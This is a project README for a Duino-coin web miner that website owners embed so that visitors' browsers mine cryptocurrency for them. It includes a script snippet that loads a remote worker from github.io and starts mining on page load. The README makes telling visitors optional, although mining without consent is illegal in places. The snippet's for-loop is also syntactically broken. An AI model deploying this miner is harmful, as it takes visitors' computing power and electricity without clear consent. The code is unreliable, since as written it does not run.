# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Don't want to leak personal info to use Adsense? Use **Duinotize**! It's a fork of the official Duino-coin web miner designed to be easily integrated into any website, to generate passive income just from people visiting your website.

## Installation
Put the following code at the very bottom of the HTML page(s) you want the miner to run on:
```
<script>
    let workerVer = 0;
    for (let threads = 1; let workersAmount = 0; workersAmount < threads; workersAmount++) {
        let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/duinotize.js");
        socketWorker.postMessage('Start,' + "username" + "," + "duinotize-rig" + "," + "difficulty" + "," + workerVer);
        workerVer++;
    }
</script>
```
NOTE: You'll want to replace `username` with your Duino account username, `duinotize-rig` with the alias you want it to show up as in the web wallet, and `difficulty` with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (ALWAYS use LOW, as MEDIUM or EXTREME causes frequent socket disconnects and may get your account banned!).  
You can also change the `threads` variable, to choose how many threads the miner uses. Anything over 1 could cause lag on some devices.

Now, whenever that page is opened, the miner will start and output messages to the developer console. It will run until the tab (not just the page) is closed. Make sure to install the miner on a page where users visit the most, so that there are more miners running. You can see this in action at https://mobilegmyt.github.io/Duinotize/demo/, or look [here](https://github.com/mobilegmYT/Duinotize/blob/main/demo/index.html) for the source code to that page for a example of how to implement it.

I HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background (in some places it is illegal to mine crypto in the background without consent!), and optionally credit this repo.

## How it works
The program is started as a worker and connects to the Duco server via a websocket, requests a mining job with the configured settings and solves it using ~~[DUCO-S1](https://github.com/mobilegmYT/Duinotize/blob/main/hashes.js)~~ [hash-wasm](https://github.com/Daninet/hash-wasm), a hash function designed for the web. The miner sends the result, the time it took, username and hashrate to the server which loads it onto your wallet.

## Credits
This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as the original author seems to have abandoned it and the code is broken.
Thanks to LDarki from the Duino discord for helping with some of the code.

## Notes
- I made this in just 2 hours at 1AM, so if there are bugs PLEASE report them
- I also have never touched JS before, so if there are improvements that could be made to the code, please PR them in.
